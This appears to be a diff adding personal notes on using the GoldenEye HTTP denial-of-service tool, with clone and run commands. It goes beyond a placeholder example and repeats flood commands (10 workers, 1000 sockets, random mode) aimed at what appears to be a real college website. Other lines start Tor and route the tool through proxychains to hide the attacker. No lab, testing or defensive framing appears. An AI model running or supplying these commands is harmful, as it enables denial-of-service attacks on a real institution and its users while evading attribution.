@@ -1,0 +1,45 @@
+4. GoldenEYE-Tool 
+
+notes : https://copilot.microsoft.com/chats/A1BkJqmuiSPAYfwuDeSbC
+
+installation 
+
+url >> https://github.com/jseidl/GoldenEye
+
+
+
+# Clone the tool
+git clone https://github.com/jseidl/GoldenEye
+cd GoldenEye
+
+# Run the tool
+python goldeneye.py <target_url>
+
+# Example: 10 workers, 1000 sockets, random mode
+python goldeneye.py http://example.com -w 10 -s 1000 -m random
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+
+ working on    Kali linux   << etherape tool >> DDoS-Stresser    >>>                                     yt:     https://youtu.be/lXcSxGYtsg0?si=mY43jHGl3h5Obghv
+
+
+# ./goldeneye.py
+# service tor start
+# etherape
+
+
+python goldeneye.py https://aaaenggcoll.ac.in/ -w 10 -s 1000 -m random
+
+
+
+# python goldeneye.py https://aaaenggcoll.ac.in/
+
+# proxychains ./goldeneye.py  https://aaaenggcoll.ac.in/
+
+
+# python goldeneye.py https://aaaenggcoll.ac.in/ -w 10 -s 1000 -m random
+
+
